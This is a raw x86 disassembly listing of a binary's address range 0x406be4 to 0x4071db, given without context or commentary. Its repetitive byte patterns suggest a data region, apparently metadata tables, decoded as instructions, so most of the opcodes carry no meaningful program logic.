  406be4:	00 00                	add    %al,(%eax)
  406be6:	00 00                	add    %al,(%eax)
  406be8:	83 00 1f             	addl   $0x1f,(%eax)
  406beb:	2d 0a 00 0d 00       	sub    $0xd000a,%eax
  406bf0:	c8 38 00 00          	enter  $0x38,$0x0
  406bf4:	00 00                	add    %al,(%eax)
  406bf6:	83 00 6c             	addl   $0x6c,(%eax)
  406bf9:	15 5d 00 0d 00       	adc    $0xd005d,%eax
  406bfe:	74 39                	je     0x406c39
  406c00:	00 00                	add    %al,(%eax)
  406c02:	00 00                	add    %al,(%eax)
  406c04:	83 00 5e             	addl   $0x5e,(%eax)
  406c07:	08 5d 00             	or     %bl,0x0(%ebp)
  406c0a:	0e                   	push   %cs
  406c0b:	00 40 3a             	add    %al,0x3a(%eax)
  406c0e:	00 00                	add    %al,(%eax)
  406c10:	00 00                	add    %al,(%eax)
  406c12:	93                   	xchg   %eax,%ebx
  406c13:	00 d4                	add    %dl,%ah
  406c15:	35 70 00 0f 00       	xor    $0xf0070,%eax
  406c1a:	30 3b                	xor    %bh,(%ebx)
  406c1c:	00 00                	add    %al,(%eax)
  406c1e:	00 00                	add    %al,(%eax)
  406c20:	83 00 10             	addl   $0x10,(%eax)
  406c23:	3e 7f 00             	jg,pt  0x406c26
  406c26:	13 00                	adc    (%eax),%eax
  406c28:	f4                   	hlt
  406c29:	3b 00                	cmp    (%eax),%eax
  406c2b:	00 00                	add    %al,(%eax)
  406c2d:	00 83 00 70 32 0a    	add    %al,0xa327000(%ebx)
  406c33:	00 14 00             	add    %dl,(%eax,%eax,1)
  406c36:	08 3c 00             	or     %bh,(%eax,%eax,1)
  406c39:	00 00                	add    %al,(%eax)
  406c3b:	00 83 00 4f 27 0a    	add    %al,0xa274f00(%ebx)
  406c41:	00 14 00             	add    %dl,(%eax,%eax,1)
  406c44:	8c 3c 00             	mov    %?,(%eax,%eax,1)
  406c47:	00 00                	add    %al,(%eax)
  406c49:	00 83 00 18 3d 85    	add    %al,-0x7ac2e800(%ebx)
  406c4f:	00 14 00             	add    %dl,(%eax,%eax,1)
  406c52:	14 3e                	adc    $0x3e,%al
  406c54:	00 00                	add    %al,(%eax)
  406c56:	00 00                	add    %al,(%eax)
  406c58:	83 18 5a             	sbbl   $0x5a,(%eax)
  406c5b:	04 0a                	add    $0xa,%al
  406c5d:	00 15 00 28 3e 00    	add    %dl,0x3e2800
  406c63:	00 00                	add    %al,(%eax)
  406c65:	00 83 18 5a 04 0a    	add    %al,0xa045a18(%ebx)
  406c6b:	00 15 00 14 3f 00    	add    %dl,0x3f1400
  406c71:	00 00                	add    %al,(%eax)
  406c73:	00 83 00 7f 13 a6    	add    %al,-0x59ec8100(%ebx)
  406c79:	00 15 00 d0 3f 00    	add    %dl,0x3fd000
  406c7f:	00 00                	add    %al,(%eax)
  406c81:	00 83 00 db 25 ab    	add    %al,-0x54da2500(%ebx)
  406c87:	00 16                	add    %dl,(%esi)
  406c89:	00 ec                	add    %ch,%ah
  406c8b:	3f                   	aas
  406c8c:	00 00                	add    %al,(%eax)
  406c8e:	00 00                	add    %al,(%eax)
  406c90:	83 00 bb             	addl   $0xffffffbb,(%eax)
  406c93:	29 6b 00             	sub    %ebp,0x0(%ebx)
  406c96:	18 00                	sbb    %al,(%eax)
  406c98:	54                   	push   %esp
  406c99:	40                   	inc    %eax
  406c9a:	00 00                	add    %al,(%eax)
  406c9c:	00 00                	add    %al,(%eax)
  406c9e:	83 00 03             	addl   $0x3,(%eax)
  406ca1:	13 b1 00 19 00 6c    	adc    0x6c001900(%ecx),%esi
  406ca7:	43                   	inc    %ebx
  406ca8:	00 00                	add    %al,(%eax)
  406caa:	00 00                	add    %al,(%eax)
  406cac:	83 00 ed             	addl   $0xffffffed,(%eax)
  406caf:	06                   	push   %es
  406cb0:	b9 00 1b 00 98       	mov    $0x98001b00,%ecx
  406cb5:	4b                   	dec    %ebx
  406cb6:	00 00                	add    %al,(%eax)
  406cb8:	00 00                	add    %al,(%eax)
  406cba:	83 00 7a             	addl   $0x7a,(%eax)
  406cbd:	22 c3                	and    %bl,%al
  406cbf:	00 1f                	add    %bl,(%edi)
  406cc1:	00 90 4c 00 00 00    	add    %dl,0x4c(%eax)
  406cc7:	00 93 00 82 21 c9    	add    %dl,-0x36de7e00(%ebx)
  406ccd:	00 20                	add    %ah,(%eax)
  406ccf:	00 dc                	add    %bl,%ah
  406cd1:	4c                   	dec    %esp
  406cd2:	00 00                	add    %al,(%eax)
  406cd4:	00 00                	add    %al,(%eax)
  406cd6:	83 00 0e             	addl   $0xe,(%eax)
  406cd9:	20 a6 00 21 00 a0    	and    %ah,-0x5fffdf00(%esi)
  406cdf:	4d                   	dec    %ebp
  406ce0:	00 00                	add    %al,(%eax)
  406ce2:	00 00                	add    %al,(%eax)
  406ce4:	83 00 56             	addl   $0x56,(%eax)
  406ce7:	09 0a                	or     %ecx,(%edx)
  406ce9:	00 22                	add    %ah,(%edx)
  406ceb:	00 40 4e             	add    %al,0x4e(%eax)
  406cee:	00 00                	add    %al,(%eax)
  406cf0:	00 00                	add    %al,(%eax)
  406cf2:	83 00 1e             	addl   $0x1e,(%eax)
  406cf5:	1e                   	push   %ds
  406cf6:	d2 00                	rolb   %cl,(%eax)
  406cf8:	22 00                	and    (%eax),%al
  406cfa:	14 4f                	adc    $0x4f,%al
  406cfc:	00 00                	add    %al,(%eax)
  406cfe:	00 00                	add    %al,(%eax)
  406d00:	83 18 5a             	sbbl   $0x5a,(%eax)
  406d03:	04 0a                	add    $0xa,%al
  406d05:	00 24 00             	add    %ah,(%eax,%eax,1)
  406d08:	50                   	push   %eax
  406d09:	4f                   	dec    %edi
  406d0a:	00 00                	add    %al,(%eax)
  406d0c:	00 00                	add    %al,(%eax)
  406d0e:	83 00 2e             	addl   $0x2e,(%eax)
  406d11:	0e                   	push   %cs
  406d12:	ab                   	stos   %eax,%es:(%edi)
  406d13:	00 24 00             	add    %ah,(%eax,%eax,1)
  406d16:	bc 50 00 00 00       	mov    $0x50,%esp
  406d1b:	00 83 00 5f 25 0a    	add    %al,0xa255f00(%ebx)
  406d21:	00 26                	add    %ah,(%esi)
  406d23:	00 48 51             	add    %cl,0x51(%eax)
  406d26:	00 00                	add    %al,(%eax)
  406d28:	00 00                	add    %al,(%eax)
  406d2a:	83 00 d2             	addl   $0xffffffd2,(%eax)
  406d2d:	09 de                	or     %ebx,%esi
  406d2f:	00 26                	add    %ah,(%esi)
  406d31:	00 78 51             	add    %bh,0x51(%eax)
  406d34:	00 00                	add    %al,(%eax)
  406d36:	00 00                	add    %al,(%eax)
  406d38:	83 00 3e             	addl   $0x3e,(%eax)
  406d3b:	0c e4                	or     $0xe4,%al
  406d3d:	00 28                	add    %ch,(%eax)
  406d3f:	00 a0 51 00 00 00    	add    %ah,0x51(%eax)
  406d45:	00 83 00 37 2a ec    	add    %al,-0x13d5c900(%ebx)
  406d4b:	00 2b                	add    %ch,(%ebx)
  406d4d:	00 14 3e             	add    %dl,(%esi,%edi,1)
  406d50:	00 00                	add    %al,(%eax)
  406d52:	00 00                	add    %al,(%eax)
  406d54:	83 18 5a             	sbbl   $0x5a,(%eax)
  406d57:	04 0a                	add    $0xa,%al
  406d59:	00 2f                	add    %ch,(%edi)
  406d5b:	00 c8                	add    %cl,%al
  406d5d:	51                   	push   %ecx
  406d5e:	00 00                	add    %al,(%eax)
  406d60:	00 00                	add    %al,(%eax)
  406d62:	83 00 bc             	addl   $0xffffffbc,(%eax)
  406d65:	38 0a                	cmp    %cl,(%edx)
  406d67:	00 2f                	add    %ch,(%edi)
  406d69:	00 e8                	add    %ch,%al
  406d6b:	51                   	push   %ecx
  406d6c:	00 00                	add    %al,(%eax)
  406d6e:	00 00                	add    %al,(%eax)
  406d70:	83 00 ca             	addl   $0xffffffca,(%eax)
  406d73:	0a 0a                	or     (%edx),%cl
  406d75:	00 2f                	add    %ch,(%edi)
  406d77:	00 68 52             	add    %ch,0x52(%eax)
  406d7a:	00 00                	add    %al,(%eax)
  406d7c:	00 00                	add    %al,(%eax)
  406d7e:	83 00 cb             	addl   $0xffffffcb,(%eax)
  406d81:	27                   	daa
  406d82:	f5                   	cmc
  406d83:	00 2f                	add    %ch,(%edi)
  406d85:	00 cc                	add    %cl,%ah
  406d87:	52                   	push   %edx
  406d88:	00 00                	add    %al,(%eax)
  406d8a:	00 00                	add    %al,(%eax)
  406d8c:	83 00 a4             	addl   $0xffffffa4,(%eax)
  406d8f:	3b fb                	cmp    %ebx,%edi
  406d91:	00 30                	add    %dh,(%eax)
  406d93:	00 fc                	add    %bh,%ah
  406d95:	53                   	push   %ebx
  406d96:	00 00                	add    %al,(%eax)
  406d98:	00 00                	add    %al,(%eax)
  406d9a:	83 00 27             	addl   $0x27,(%eax)
  406d9d:	2c a6                	sub    $0xa6,%al
  406d9f:	00 32                	add    %dh,(%edx)
  406da1:	00 84 54 00 00 00 00 	add    %al,0x0(%esp,%edx,2)
  406da8:	83 00 ea             	addl   $0xffffffea,(%eax)
  406dab:	41                   	inc    %ecx
  406dac:	02 01                	add    (%ecx),%al
  406dae:	33 00                	xor    (%eax),%eax
  406db0:	10 55 00             	adc    %dl,0x0(%ebp)
  406db3:	00 00                	add    %al,(%eax)
  406db5:	00 83 00 e2 07 0a    	add    %al,0xa07e200(%ebx)
  406dbb:	00 35 00 4c 55 00    	add    %dh,0x554c00
  406dc1:	00 00                	add    %al,(%eax)
  406dc3:	00 83 00 c3 28 0a    	add    %al,0xa28c300(%ebx)
  406dc9:	00 35 00 30 56 00    	add    %dh,0x563000
  406dcf:	00 00                	add    %al,(%eax)
  406dd1:	00 83 00 e0 16 09    	add    %al,0x916e000(%ebx)
  406dd7:	01 35 00 78 57 00    	add    %esi,0x577800
  406ddd:	00 00                	add    %al,(%eax)
  406ddf:	00 83 00 f2 40 0f    	add    %al,0xf40f200(%ebx)
  406de5:	01 37                	add    %esi,(%edi)
  406de7:	00 e4                	add    %ah,%ah
  406de9:	57                   	push   %edi
  406dea:	00 00                	add    %al,(%eax)
  406dec:	00 00                	add    %al,(%eax)
  406dee:	83 00 57             	addl   $0x57,(%eax)
  406df1:	26 14 01             	es adc $0x1,%al
  406df4:	38 00                	cmp    %al,(%eax)
  406df6:	14 3e                	adc    $0x3e,%al
  406df8:	00 00                	add    %al,(%eax)
  406dfa:	00 00                	add    %al,(%eax)
  406dfc:	83 18 5a             	sbbl   $0x5a,(%eax)
  406dff:	04 0a                	add    $0xa,%al
  406e01:	00 39                	add    %bh,(%ecx)
  406e03:	00 64 58 00          	add    %ah,0x0(%eax,%ebx,2)
  406e07:	00 00                	add    %al,(%eax)
  406e09:	00 83 00 0c 2f 0a    	add    %al,0xa2f0c00(%ebx)
  406e0f:	00 39                	add    %bh,(%ecx)
  406e11:	00 78 58             	add    %bh,0x58(%eax)
  406e14:	00 00                	add    %al,(%eax)
  406e16:	00 00                	add    %al,(%eax)
  406e18:	83 00 f3             	addl   $0xfffffff3,(%eax)
  406e1b:	22 0a                	and    (%edx),%cl
  406e1d:	00 39                	add    %bh,(%ecx)
  406e1f:	00 3c 59             	add    %bh,(%ecx,%ebx,2)
  406e22:	00 00                	add    %al,(%eax)
  406e24:	00 00                	add    %al,(%eax)
  406e26:	83 00 58             	addl   $0x58,(%eax)
  406e29:	35 0a 00 39 00       	xor    $0x39000a,%eax
  406e2e:	60                   	pusha
  406e2f:	59                   	pop    %ecx
  406e30:	00 00                	add    %al,(%eax)
  406e32:	00 00                	add    %al,(%eax)
  406e34:	83 00 c8             	addl   $0xffffffc8,(%eax)
  406e37:	19 0a                	sbb    %ecx,(%edx)
  406e39:	00 39                	add    %bh,(%ecx)
  406e3b:	00 84 59 00 00 00 00 	add    %al,0x0(%ecx,%ebx,2)
  406e42:	83 00 64             	addl   $0x64,(%eax)
  406e45:	16                   	push   %ss
  406e46:	0a 00                	or     (%eax),%al
  406e48:	39 00                	cmp    %eax,(%eax)
  406e4a:	a8 59                	test   $0x59,%al
  406e4c:	00 00                	add    %al,(%eax)
  406e4e:	00 00                	add    %al,(%eax)
  406e50:	83 00 77             	addl   $0x77,(%eax)
  406e53:	14 19                	adc    $0x19,%al
  406e55:	01 39                	add    %edi,(%ecx)
  406e57:	00 c0                	add    %al,%al
  406e59:	59                   	pop    %ecx
  406e5a:	00 00                	add    %al,(%eax)
  406e5c:	08 00                	or     %al,(%eax)
  406e5e:	91                   	xchg   %eax,%ecx
  406e5f:	00 47 28             	add    %al,0x28(%edi)
  406e62:	1d 01 39 00 00       	sbb    $0x3901,%eax
  406e67:	5b                   	pop    %ebx
  406e68:	00 00                	add    %al,(%eax)
  406e6a:	08 00                	or     %al,(%eax)
  406e6c:	91                   	xchg   %eax,%ecx
  406e6d:	00 ac 3a 23 01 3a 00 	add    %ch,0x3a0123(%edx,%edi,1)
  406e74:	98                   	cwtl
  406e75:	5c                   	pop    %esp
  406e76:	00 00                	add    %al,(%eax)
  406e78:	00 00                	add    %al,(%eax)
  406e7a:	86 18                	xchg   %bl,(%eax)
  406e7c:	5a                   	pop    %edx
  406e7d:	04 0a                	add    $0xa,%al
  406e7f:	00 3d 00 e0 5c 00    	add    %bh,0x5ce000
  406e85:	00 00                	add    %al,(%eax)
  406e87:	00 10                	add    %dl,(%eax)
  406e89:	00 16                	add    %dl,(%esi)
  406e8b:	1f                   	pop    %ds
  406e8c:	2a 01                	sub    (%ecx),%al
  406e8e:	3d 00 f4 5c 00       	cmp    $0x5cf400,%eax
  406e93:	00 00                	add    %al,(%eax)
  406e95:	00 10                	add    %dl,(%eax)
  406e97:	00 fa                	add    %bh,%dl
  406e99:	3f                   	aas
  406e9a:	2e 01 3d 00 0c 5d 00 	add    %edi,%cs:0x5d0c00
  406ea1:	00 00                	add    %al,(%eax)
  406ea3:	00 10                	add    %dl,(%eax)
  406ea5:	00 9a 10 35 01 3d    	add    %bl,0x3d013510(%edx)
  406eab:	00 20                	add    %ah,(%eax)
  406ead:	5d                   	pop    %ebp
  406eae:	00 00                	add    %al,(%eax)
  406eb0:	00 00                	add    %al,(%eax)
  406eb2:	10 00                	adc    %al,(%eax)
  406eb4:	28 3b                	sub    %bh,(%ebx)
  406eb6:	3b 01                	cmp    (%ecx),%eax
  406eb8:	3d 00 34 5d 00       	cmp    $0x5d3400,%eax
  406ebd:	00 00                	add    %al,(%eax)
  406ebf:	00 10                	add    %dl,(%eax)
  406ec1:	00 e4                	add    %ah,%ah
  406ec3:	33 40 01             	xor    0x1(%eax),%eax
  406ec6:	3d 00 48 5d 00       	cmp    $0x5d4800,%eax
  406ecb:	00 00                	add    %al,(%eax)
  406ecd:	00 10                	add    %dl,(%eax)
  406ecf:	00 76 40             	add    %dh,0x40(%esi)
  406ed2:	46                   	inc    %esi
  406ed3:	01 3d 00 5c 5d 00    	add    %edi,0x5d5c00
  406ed9:	00 00                	add    %al,(%eax)
  406edb:	00 10                	add    %dl,(%eax)
  406edd:	00 80 30 4c 01 3d    	add    %al,0x3d014c30(%eax)
  406ee3:	00 70 5d             	add    %dh,0x5d(%eax)
  406ee6:	00 00                	add    %al,(%eax)
  406ee8:	00 00                	add    %al,(%eax)
  406eea:	10 00                	adc    %al,(%eax)
  406eec:	d8 17                	fcoms  (%edi)
  406eee:	51                   	push   %ecx
  406eef:	01 3d 00 84 5d 00    	add    %edi,0x5d8400
  406ef5:	00 00                	add    %al,(%eax)
  406ef7:	00 10                	add    %dl,(%eax)
  406ef9:	00 67 24             	add    %ah,0x24(%edi)
  406efc:	51                   	push   %ecx
  406efd:	01 3d 00 98 5d 00    	add    %edi,0x5d9800
  406f03:	00 00                	add    %al,(%eax)
  406f05:	00 10                	add    %dl,(%eax)
  406f07:	00 ba 0c 58 01 3d    	add    %bh,0x3d01580c(%edx)
  406f0d:	00 ac 5d 00 00 00 00 	add    %ch,0x0(%ebp,%ebx,2)
  406f14:	10 00                	adc    %al,(%eax)
  406f16:	6e                   	outsb  %ds:(%esi),(%dx)
  406f17:	41                   	inc    %ecx
  406f18:	58                   	pop    %eax
  406f19:	01 3d 00 c0 5d 00    	add    %edi,0x5dc000
  406f1f:	00 00                	add    %al,(%eax)
  406f21:	00 10                	add    %dl,(%eax)
  406f23:	00 90 2e 5f 01 3d    	add    %dl,0x3d015f2e(%eax)
  406f29:	00 d4                	add    %dl,%ah
  406f2b:	5d                   	pop    %ebp
  406f2c:	00 00                	add    %al,(%eax)
  406f2e:	00 00                	add    %al,(%eax)
  406f30:	10 00                	adc    %al,(%eax)
  406f32:	0b 12                	or     (%edx),%edx
  406f34:	58                   	pop    %eax
  406f35:	01 3d 00 e8 5d 00    	add    %edi,0x5de800
  406f3b:	00 00                	add    %al,(%eax)
  406f3d:	00 10                	add    %dl,(%eax)
  406f3f:	00 14 2e             	add    %dl,(%esi,%ebp,1)
  406f42:	58                   	pop    %eax
  406f43:	01 3d 00 fc 5d 00    	add    %edi,0x5dfc00
  406f49:	00 00                	add    %al,(%eax)
  406f4b:	00 10                	add    %dl,(%eax)
  406f4d:	00 cc                	add    %cl,%ah
  406f4f:	36 58                	ss pop %eax
  406f51:	01 3d 00 10 5e 00    	add    %edi,0x5e1000
  406f57:	00 00                	add    %al,(%eax)
  406f59:	00 10                	add    %dl,(%eax)
  406f5b:	00 54 18 67          	add    %dl,0x67(%eax,%ebx,1)
  406f5f:	01 3d 00 24 5e 00    	add    %edi,0x5e2400
  406f65:	00 00                	add    %al,(%eax)
  406f67:	00 10                	add    %dl,(%eax)
  406f69:	00 66 07             	add    %ah,0x7(%esi)
  406f6c:	6e                   	outsb  %ds:(%esi),(%dx)
  406f6d:	01 3d 00 48 60 00    	add    %edi,0x604800
  406f73:	00 00                	add    %al,(%eax)
  406f75:	00 86 18 5a 04 74    	add    %al,0x74045a18(%esi)
  406f7b:	01 3d 00 00 00 01    	add    %edi,0x1000000
  406f81:	00 3b                	add    %bh,(%ebx)
  406f83:	00 00                	add    %al,(%eax)
  406f85:	00 01                	add    %al,(%ecx)
  406f87:	00 57 00             	add    %dl,0x0(%edi)
  406f8a:	00 00                	add    %al,(%eax)
  406f8c:	01 00                	add    %eax,(%eax)
  406f8e:	57                   	push   %edi
  406f8f:	00 00                	add    %al,(%eax)
  406f91:	00 01                	add    %al,(%ecx)
  406f93:	00 57 00             	add    %dl,0x0(%edi)
  406f96:	00 00                	add    %al,(%eax)
  406f98:	01 00                	add    %eax,(%eax)
  406f9a:	57                   	push   %edi
  406f9b:	00 00                	add    %al,(%eax)
  406f9d:	00 01                	add    %al,(%ecx)
  406f9f:	00 57 00             	add    %dl,0x0(%edi)
  406fa2:	00 00                	add    %al,(%eax)
  406fa4:	01 00                	add    %eax,(%eax)
  406fa6:	34 05                	xor    $0x5,%al
  406fa8:	00 00                	add    %al,(%eax)
  406faa:	02 00                	add    (%eax),%al
  406fac:	14 03                	adc    $0x3,%al
  406fae:	00 00                	add    %al,(%eax)
  406fb0:	03 00                	add    (%eax),%eax
  406fb2:	a3 05 02 00 04       	mov    %eax,0x4000205
  406fb7:	00 85 05 00 00 01    	add    %al,0x1000005(%ebp)
  406fbd:	00 1f                	add    %bl,(%edi)
  406fbf:	04 00                	add    $0x0,%al
  406fc1:	00 01                	add    %al,(%ecx)
  406fc3:	00 02                	add    %al,(%edx)
  406fc5:	05 00 00 01 00       	add    $0x10000,%eax
  406fca:	1f                   	pop    %ds
  406fcb:	04 00                	add    $0x0,%al
  406fcd:	00 01                	add    %al,(%ecx)
  406fcf:	00 1f                	add    %bl,(%edi)
  406fd1:	04 00                	add    $0x0,%al
  406fd3:	00 01                	add    %al,(%ecx)
  406fd5:	00 ee                	add    %ch,%dh
  406fd7:	04 00                	add    $0x0,%al
  406fd9:	00 02                	add    %al,(%edx)
  406fdb:	00 14 06             	add    %dl,(%esi,%eax,1)
  406fde:	00 00                	add    %al,(%eax)
  406fe0:	03 00                	add    (%eax),%eax
  406fe2:	1f                   	pop    %ds
  406fe3:	04 00                	add    $0x0,%al
  406fe5:	00 04 00             	add    %al,(%eax,%eax,1)
  406fe8:	f5                   	cmc
  406fe9:	04 00                	add    $0x0,%al
  406feb:	00 01                	add    %al,(%ecx)
  406fed:	00 c3                	add    %al,%bl
  406fef:	03 00                	add    (%eax),%eax
  406ff1:	00 01                	add    %al,(%ecx)
  406ff3:	00 3e                	add    %bh,(%esi)
  406ff5:	05 00 00 01 00       	add    $0x10000,%eax
  406ffa:	26 03 00             	add    %es:(%eax),%eax
  406ffd:	00 01                	add    %al,(%ecx)
  406fff:	00 1c 04             	add    %bl,(%esp,%eax,1)
  407002:	00 00                	add    %al,(%eax)
  407004:	02 00                	add    (%eax),%al
  407006:	4c                   	dec    %esp
  407007:	00 00                	add    %al,(%eax)
  407009:	00 01                	add    %al,(%ecx)
  40700b:	00 49 00             	add    %cl,0x0(%ecx)
  40700e:	00 00                	add    %al,(%eax)
  407010:	01 00                	add    %eax,(%eax)
  407012:	a3 03 00 00 02       	mov    %eax,0x2000003
  407017:	00 ac 03 00 00 01 00 	add    %ch,0x10000(%ebx,%eax,1)
  40701e:	a3 03 00 00 02       	mov    %eax,0x2000003
  407023:	00 ac 03 00 00 03 00 	add    %ch,0x30000(%ebx,%eax,1)
  40702a:	05 03 00 00 04       	add    $0x4000003,%eax
  40702f:	00 0c 03             	add    %cl,(%ebx,%eax,1)
  407032:	00 00                	add    %al,(%eax)
  407034:	01 00                	add    %eax,(%eax)
  407036:	cf                   	iret
  407037:	04 00                	add    $0x0,%al
  407039:	00 01                	add    %al,(%ecx)
  40703b:	00 e0                	add    %ah,%al
  40703d:	03 00                	add    (%eax),%eax
  40703f:	00 01                	add    %al,(%ecx)
  407041:	00 da                	add    %bl,%dl
  407043:	04 00                	add    $0x0,%al
  407045:	00 01                	add    %al,(%ecx)
  407047:	00 1f                	add    %bl,(%edi)
  407049:	04 00                	add    $0x0,%al
  40704b:	00 02                	add    %al,(%edx)
  40704d:	00 29                	add    %ch,(%ecx)
  40704f:	01 00                	add    %eax,(%eax)
  407051:	00 01                	add    %al,(%ecx)
  407053:	00 4b 05             	add    %cl,0x5(%ebx)
  407056:	00 00                	add    %al,(%eax)
  407058:	02 00                	add    (%eax),%al
  40705a:	56                   	push   %esi
  40705b:	05 00 00 01 00       	add    $0x10000,%eax
  407060:	0f 05                	syscall
  407062:	00 00                	add    %al,(%eax)
  407064:	02 00                	add    (%eax),%al
  407066:	f0 02 00             	lock add (%eax),%al
  407069:	00 01                	add    %al,(%ecx)
  40706b:	00 1f                	add    %bl,(%edi)
  40706d:	04 00                	add    $0x0,%al
  40706f:	00 02                	add    %al,(%edx)
  407071:	00 0f                	add    %cl,(%edi)
  407073:	05 00 00 03 00       	add    $0x30000,%eax
  407078:	f0 02 00             	lock add (%eax),%al
  40707b:	00 01                	add    %al,(%ecx)
  40707d:	00 1f                	add    %bl,(%edi)
  40707f:	04 00                	add    $0x0,%al
  407081:	00 02                	add    %al,(%edx)
  407083:	00 0f                	add    %cl,(%edi)
  407085:	05 00 00 03 00       	add    $0x30000,%eax
  40708a:	f0 02 00             	lock add (%eax),%al
  40708d:	00 04 00             	add    %al,(%eax,%eax,1)
  407090:	e6 02                	out    %al,$0x2
  407092:	00 00                	add    %al,(%eax)
  407094:	01 00                	add    %eax,(%eax)
  407096:	1f                   	pop    %ds
  407097:	04 00                	add    $0x0,%al
  407099:	00 01                	add    %al,(%ecx)
  40709b:	00 1f                	add    %bl,(%edi)
  40709d:	04 00                	add    $0x0,%al
  40709f:	00 02                	add    %al,(%edx)
  4070a1:	00 e6                	add    %ah,%dh
  4070a3:	02 00                	add    (%eax),%al
  4070a5:	00 01                	add    %al,(%ecx)
  4070a7:	00 1b                	add    %bl,(%ebx)
  4070a9:	03 00                	add    (%eax),%eax
  4070ab:	00 01                	add    %al,(%ecx)
  4070ad:	00 c3                	add    %al,%bl
  4070af:	03 00                	add    (%eax),%eax
  4070b1:	00 02                	add    %al,(%edx)
  4070b3:	00 54 00 00          	add    %dl,0x0(%eax,%eax,1)
  4070b7:	00 01                	add    %al,(%ecx)
  4070b9:	00 5a 00             	add    %bl,0x0(%edx)
  4070bc:	00 00                	add    %al,(%eax)
  4070be:	02 00                	add    (%eax),%al
  4070c0:	e0 03                	loopne 0x4070c5
  4070c2:	00 00                	add    %al,(%eax)
  4070c4:	01 00                	add    %eax,(%eax)
  4070c6:	4a                   	dec    %edx
  4070c7:	00 00                	add    %al,(%eax)
  4070c9:	00 01                	add    %al,(%ecx)
  4070cb:	00 5a 00             	add    %bl,0x0(%edx)
  4070ce:	00 00                	add    %al,(%eax)
  4070d0:	01 00                	add    %eax,(%eax)
  4070d2:	00 00                	add    %al,(%eax)
  4070d4:	00 00                	add    %al,(%eax)
  4070d6:	01 00                	add    %eax,(%eax)
  4070d8:	00 00                	add    %al,(%eax)
  4070da:	00 00                	add    %al,(%eax)
  4070dc:	02 00                	add    (%eax),%al
  4070de:	00 00                	add    %al,(%eax)
  4070e0:	00 00                	add    %al,(%eax)
  4070e2:	03 00                	add    (%eax),%eax
  4070e4:	00 00                	add    %al,(%eax)
  4070e6:	09 00                	or     %eax,(%eax)
  4070e8:	5a                   	pop    %edx
  4070e9:	04 0a                	add    $0xa,%al
  4070eb:	00 51 00             	add    %dl,0x0(%ecx)
  4070ee:	5a                   	pop    %edx
  4070ef:	04 6b                	add    $0x6b,%al
  4070f1:	00 59 00             	add    %bl,0x0(%ecx)
  4070f4:	5a                   	pop    %edx
  4070f5:	04 0a                	add    $0xa,%al
  4070f7:	00 61 00             	add    %ah,0x0(%ecx)
  4070fa:	5a                   	pop    %edx
  4070fb:	04 a1                	add    $0xa1,%al
  4070fd:	01 71 00             	add    %esi,0x0(%ecx)
  407100:	5a                   	pop    %edx
  407101:	04 74                	add    $0x74,%al
  407103:	01 79 00             	add    %edi,0x0(%ecx)
  407106:	5a                   	pop    %edx
  407107:	04 74                	add    $0x74,%al
  407109:	01 81 00 5a 04 74    	add    %eax,0x74045a00(%ecx)
  40710f:	01 89 00 5a 04 74    	add    %ecx,0x74045a00(%ecx)
  407115:	01 91 00 5a 04 74    	add    %edx,0x74045a00(%ecx)
  40711b:	01 99 00 5a 04 74    	add    %ebx,0x74045a00(%ecx)
  407121:	01 a1 00 5a 04 74    	add    %esp,0x74045a00(%ecx)
  407127:	01 a9 00 5a 04 f5    	add    %ebp,-0xafba600(%ecx)
  40712d:	01 b1 00 5a 04 74    	add    %esi,0x74045a00(%ecx)
  407133:	01 b9 00 5a 04 74    	add    %edi,0x74045a00(%ecx)
  407139:	01 c1                	add    %eax,%ecx
  40713b:	00 5a 04             	add    %bl,0x4(%edx)
  40713e:	74 01                	je     0x407141
  407140:	c9                   	leave
  407141:	00 5a 04             	add    %bl,0x4(%edx)
  407144:	c3                   	ret
  407145:	00 d9                	add    %bl,%cl
  407147:	00 21                	add    %ah,(%ecx)
  407149:	01 8e 02 e1 00 d1    	add    %ecx,-0x2eff1efe(%esi)
  40714f:	03 9f 00 21 00 4f    	add    0x4f002100(%edi),%ebx
  407155:	00 96 02 e1 00 0a    	add    %dl,0xa00e102(%esi)
  40715b:	00 9e 02 c9 00 5a    	add    %bl,0x5a00c902(%esi)
  407161:	04 a5                	add    $0xa5,%al
  407163:	02 21                	add    (%ecx),%ah
  407165:	00 83 03 ac 02 f1    	add    %al,-0xefd53fd(%ebx)
  40716b:	00 1f                	add    %bl,(%edi)
  40716d:	06                   	push   %es
  40716e:	c4 02                	les    (%edx),%eax
  407170:	01 01                	add    %eax,(%ecx)
  407172:	42                   	inc    %edx
  407173:	06                   	push   %es
  407174:	dd 02                	fldl   (%edx)
  407176:	01 01                	add    %eax,(%ecx)
  407178:	2f                   	das
  407179:	06                   	push   %es
  40717a:	dd 02                	fldl   (%edx)
  40717c:	19 00                	sbb    %eax,(%eax)
  40717e:	e7 04                	out    %eax,$0x4
  407180:	e3 02                	jecxz  0x407184
  407182:	09 01                	or     %eax,(%ecx)
  407184:	12 00                	adc    (%eax),%al
  407186:	e8 02 09 01 58       	call   0x58417a8d
  40718b:	03 ee                	add    %esi,%ebp
  40718d:	02 11                	add    (%ecx),%dl
  40718f:	01 f6                	add    %esi,%esi
  407191:	03 f6                	add    %esi,%esi
  407193:	02 19                	add    (%ecx),%bl
  407195:	01 97 00 fe 02 19    	add    %edx,0x1902fe00(%edi)
  40719b:	01 12                	add    %edx,(%edx)
  40719d:	01 07                	add    %eax,(%edi)
  40719f:	03 d9                	add    %ecx,%ebx
  4071a1:	00 63 00             	add    %ah,0x0(%ebx)
  4071a4:	0d 03 29 01 57       	or     $0x57012903,%eax
  4071a9:	06                   	push   %es
  4071aa:	16                   	push   %ss
  4071ab:	03 19                	add    (%ecx),%ebx
  4071ad:	01 ae 00 42 03 31    	add    %ebp,0x31034200(%esi)
  4071b3:	01 dc                	add    %ebx,%esp
  4071b5:	00 48 03             	add    %cl,0x3(%eax)
  4071b8:	11 01                	adc    %eax,(%ecx)
  4071ba:	83 03 4c             	addl   $0x4c,(%ebx)
  4071bd:	03 11                	add    (%ecx),%edx
  4071bf:	01 13                	add    %edx,(%ebx)
  4071c1:	05 50 03 39 01       	add    $0x1390350,%eax
  4071c6:	24 00                	and    $0x0,%al
  4071c8:	55                   	push   %ebp
  4071c9:	03 41 01             	add    0x1(%ecx),%eax
  4071cc:	b0 05                	mov    $0x5,%al
  4071ce:	5c                   	pop    %esp
  4071cf:	03 41 01             	add    0x1(%ecx),%eax
  4071d2:	b0 05                	mov    $0x5,%al
  4071d4:	62 03                	bound  %eax,(%ebx)
  4071d6:	21 00                	and    %eax,(%eax)
  4071d8:	dd 02                	fldl   (%edx)
  4071da:	4c                   	dec    %esp
  4071db:	03 19                	add    (%ecx),%ebx
